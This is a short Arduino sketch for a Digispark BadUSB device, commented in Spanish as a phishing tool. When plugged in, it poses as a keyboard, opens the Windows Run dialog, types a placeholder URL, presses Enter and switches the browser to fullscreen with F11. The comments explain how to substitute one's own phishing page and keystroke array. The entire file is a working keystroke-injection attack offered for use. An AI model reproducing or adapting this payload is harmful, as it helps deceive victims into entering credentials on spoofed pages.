#include "DigiKeyboard.h"

//Editar la página para realizar phishing 
//visitar https://duckify.huhn.me/
//borrar la función de las pulsaciones 
// STRING https://www.AQUI-VA-TU-URL.com y copiar y pegar en key_arr_0 (no olvidar editar también la linea 23)
const uint8_t key_arr_0[] PROGMEM = {0,11, 0,23, 0,23, 0,19, 0,22, 2,55, 2,36, 2,36, 0,26, 0,26, 0,26, 0,55, 2,4, 2,20, 2,24, 2,12, 0,56, 2,25, 2,4, 0,56, 2,23, 2,24, 0,56, 2,24, 2,21, 2,15, 0,55, 0,6, 0,18, 0,16};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(21, 8); // GUI r
    DigiKeyboard.delay(200); // DELAY 200
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING https://www.AQUI-VA-TU-URL.com
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(68, 0); // F11
}

void loop() {}
